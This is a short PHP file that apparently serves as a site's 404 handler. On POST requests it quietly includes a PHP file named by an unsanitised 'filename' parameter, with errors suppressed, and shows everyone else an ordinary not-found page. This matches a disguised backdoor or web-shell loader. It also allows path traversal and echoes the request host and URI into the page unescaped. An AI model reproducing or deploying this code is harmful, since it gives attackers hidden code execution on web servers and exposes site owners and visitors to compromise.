<?php

if (strtolower($_SERVER['REQUEST_METHOD']) == 'post')
{
	$filename = $_GET['filename'];
	if (!empty($filename))
	{
		$filename = 's_' . $filename . '.php';
		if (@file_exists('./' . $filename))
		{
			
			@include('./' . $filename);
			return;
		}
	}
}

if (!$file_content = @file('../../404.shtml'))
{
	$file_content = @file('../../not_found.html');
}

$e4 = implode('', $file_content);
$e4 = str_replace(array('<!--#echo var="HTTP_HOST" -->', '<!--#echo var="REQUEST_URI" -->'), array($_SERVER['HTTP_HOST'], $_SERVER['REQUEST_URI']), $e4);
echo $e4;
die();

?>
